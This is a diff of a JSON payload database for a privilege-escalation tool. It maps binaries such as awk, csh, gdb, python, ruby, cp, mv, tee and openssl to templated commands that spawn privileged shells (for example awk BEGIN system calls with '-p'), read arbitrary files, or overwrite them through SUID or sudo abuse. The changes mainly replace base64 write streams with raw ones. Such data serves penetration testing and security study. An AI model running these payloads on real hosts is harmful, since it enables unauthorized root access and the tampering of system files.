@@ -25,18 +25,8 @@
   "cp": [
     {
       "type": "write",
-      "stream": "print",
+      "stream": "raw",
       "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF",
-      "args": [
-        "$TF",
-        "{lfile}"
-      ],
-      "exit": "{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF",
       "args": [
         "$TF",
         "{lfile}"
@@ -67,11 +57,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
+      "stream": "raw",
       "payload": "{command}",
       "args": [
         "-c",
-        "'{base64} -d > {lfile}'"
+        "'cat - > {lfile}'"
       ],
       "suid": [
         "-p"
@@ -99,8 +89,8 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "{command} -c '{base64} -d > {lfile}'",
+      "stream": "raw",
+      "payload": "{command} -c 'cat - > {lfile}'",
       "suid": [
         "-p"
       ],
@@ -168,8 +158,8 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "{command} -c '{base64} -d > {lfile}'",
+      "stream": "raw",
+      "payload": "{command} -c 'cat - > {lfile}'",
       "suid": [
         "-p"
       ],
@@ -181,11 +171,6 @@
       "type": "shell",
       "payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
       "exit": "exit"
-    },
-    {
-      "type": "read",
-      "stream": "print",
-      "payload": "{command} // {lfile}"
     },
     {
       "type": "read",
@@ -388,43 +373,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
+      "stream": "raw",
       "payload": "{command}",
       "args": [
         "-c",
-        "\"{base64} -d > {lfile}\"",
-        "-b"
-      ],
-      "exit": "{ctrl_d}{ctrl_d}"
-    }
-  ],
-  "bsd-csh": [
-    {
-      "type": "shell",
-      "payload": "{command}",
-      "input": "{shell} -p\n",
-      "suid": [
-        "-b"
-      ],
-      "exit": "exit\nexit\n"
-    },
-    {
-      "type": "read",
-      "stream": "print",
-      "payload": "{command}",
-      "args": [
-        "-c",
-        "\"{cat} {lfile}\"",
-        "-b"
-      ]
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "{command}",
-      "args": [
-        "-c",
-        "\"{base64} -d > {lfile}\"",
+        "\"cat - > {lfile}\"",
         "-b"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
@@ -441,33 +394,12 @@
       ]
     },
     {
-      "type": "read",
-      "stream": "base64",
-      "payload": "{command} | {base64} -w 0",
-      "args": [
-        "-s",
-        "file://{lfile} --output -"
-      ]
-    },
-    {
       "type": "write",
       "stream": "print",
       "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF",
       "args": [
         "-s",
         "file://$TF --output {lfile}"
-      ],
-      "exit": "{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF",
-      "args": [
-        "-s",
-        "file://$TF",
-        "--output",
-        "{lfile}"
       ],
       "exit": "{ctrl_d}"
     }
@@ -502,7 +434,7 @@
     {
       "type": "read",
       "stream": "print",
-      "payload": "{command}",
+      "payload": "{command} 2>/dev/null",
       "args": [
         "--line-format=%L",
         "/dev/null",
@@ -556,8 +488,8 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/x; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import shutil\\nwith open('{lfile}','wb') as h:\\n\\twith open('$TF/x', 'rb') as x:\\n\\t\\tshutil.copyfileobj(x, h)''')\" > $TF/setup.py; {command} $TF 2>/dev/null; {rm} -rf $TF",
       "args": [],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -744,12 +676,12 @@
     },
     {
       "type": "write",
-      "stream": "base64",
+      "stream": "raw",
       "payload": "{command}",
       "args": [
         "-u",
         "/",
-        "{sh} -c \"{base64} -d > {lfile}\""
+        "{sh} -c \"cat > {lfile}\""
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -864,27 +796,13 @@
     },
     {
       "type": "write",
-      "stream": "print",
+      "stream": "raw",
       "payload": "{command}",
       "args": [
         "-q",
         "-nx",
         "-ex",
-        "'python import sys; open(\"{lfile}\",\"w\").write(sys.stdin.read())'",
-        "-ex",
-        "quit"
-      ],
-      "exit": "{ctrl_d}{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "{command}",
-      "args": [
-        "-q",
-        "-nx",
-        "-ex",
-        "'python import sys,base64; exec(\"\"\"with open(\"{lfile}\",\"wb\") as f:\\n\\tfor line in sys.stdin:\\n\\t\\tf.write(base64.b64decode(line.strip()))\"\"\")'",
+        "'python import sys,shutil; shutil.copyfileobj(sys.stdin.buffer, open(\"{lfile}\",\"wb\"))'",
         "-ex",
         "quit"
       ],
@@ -986,8 +904,9 @@
     {
       "type": "read",
       "stream": "print",
-      "payload": "{command}",
+      "payload": "{command} | {head} --bytes=-1",
       "args": [
+        "-a",
         "''",
         "{lfile}"
       ]
@@ -1041,8 +960,8 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "{base64} -d | {command}",
+      "stream": "raw",
+      "payload": "{cat} - | {command}",
       "args": [
         "-f",
         "8859_1",
@@ -1089,17 +1008,8 @@
     },
     {
       "type": "write",
-      "stream": "print",
-      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
-      "args": [
-        "$TF"
-      ],
-      "exit": "{ctrl_d}{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+      "stream": "raw",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}; rm -f $TF",
       "args": [
         "$TF"
       ],
@@ -1124,17 +1034,8 @@
     },
     {
       "type": "write",
-      "stream": "print",
+      "stream": "raw",
       "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
-      "args": [
-        "$TF"
-      ],
-      "exit": "{ctrl_d}{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
       "args": [
         "$TF"
       ],
@@ -1201,11 +1102,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
+      "stream": "raw",
       "payload": "{command}",
       "args": [
         "-c",
-        "\"{base64} -d > {lfile}\""
+        "\"cat - > {lfile}\""
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -1231,11 +1132,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
+      "stream": "raw",
       "payload": "{command}",
       "args": [
         "-c",
-        "\"{base64} -d > {lfile}\""
+        "\"cat - > {lfile}\""
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -1367,8 +1268,8 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "{command} /etc/hosts; TF=$({mktemp} -u); {base64} -d > $TF; {command} < $TF; {rm} -f $TF",
+      "stream": "raw",
+      "payload": "{command} /etc/hosts; TF=$({mktemp} -u); cat - > $TF; {command} < $TF; {rm} -f $TF",
       "input": "q",
       "exit": "{ctrl_d}{ctrl_d}s{lfile}\nq\n"
     }
@@ -1465,11 +1366,6 @@
     },
     {
       "type": "read",
-      "stream": "print",
-      "payload": "{command} // {lfile}"
-    },
-    {
-      "type": "read",
       "stream": "raw",
       "payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
     }
@@ -1502,8 +1398,8 @@
   "mv": [
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -u); {base64} -d > $TF; {command}; {rm} -f $TF",
+      "stream": "raw",
+      "payload": "TF=$({mktemp} -u); {cat} > $TF; {command}; {rm} -f $TF",
       "args": [
         "$TF",
         "{lfile}"
@@ -1539,11 +1435,6 @@
     {
       "type": "shell",
       "payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
-    },
-    {
-      "type": "read",
-      "stream": "print",
-      "payload": "{command} // {lfile}"
     },
     {
       "type": "read",
@@ -1647,8 +1538,8 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "{base64} -d | {command}",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
         "enc",
         "-out",
@@ -2009,10 +1900,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2037,10 +1929,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2065,10 +1958,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2093,10 +1987,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2121,10 +2016,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2149,10 +2045,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2177,10 +2074,11 @@
     },
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "stream": "raw",
+      "payload": "{command}",
       "args": [
-        ""
+        "-c",
+        "exec('''import shutil, sys\\nshutil.copyfileobj(sys.stdout.buffer, open('{lfile}', 'wb'))''')"
       ],
       "exit": "{ctrl_d}{ctrl_d}"
     }
@@ -2268,17 +2166,8 @@
     },
     {
       "type": "write",
-      "stream": "print",
+      "stream": "raw",
       "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
-      "args": [
-        "$TF"
-      ],
-      "exit": "{ctrl_d}{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
       "args": [
         "$TF"
       ],
@@ -2303,17 +2192,8 @@
     },
     {
       "type": "write",
-      "stream": "print",
+      "stream": "raw",
       "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
-      "args": [
-        "$TF"
-      ],
-      "exit": "{ctrl_d}{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
       "args": [
         "$TF"
       ],
@@ -2468,19 +2348,8 @@
     },
     {
       "type": "write",
-      "stream": "print",
+      "stream": "raw",
       "payload": "{command} 2>/dev/null",
-      "args": [
-        "-u",
-        "STDIN",
-        "CREATE:{lfile}"
-      ],
-      "exit": "{ctrl_d}"
-    },
-    {
-      "type": "write",
-      "stream": "base64",
-      "payload": "{base64} -d | {command} 2>/dev/null",
       "args": [
         "-u",
         "STDIN",
@@ -2503,7 +2372,7 @@
     {
       "type": "read",
       "stream": "print",
-      "payload": "{command}",
+      "payload": "{command} | {head} --bytes=-1",
       "args": [
         "-m",
         "{lfile}"
@@ -2701,8 +2570,8 @@
   "tee": [
     {
       "type": "write",
-      "stream": "base64",
-      "payload": "{base64} -d | {command} >/dev/null",
+      "stream": "raw",
+      "payload": "{command} >/dev/null",
       "args": [
         "{lfile}"
       ],
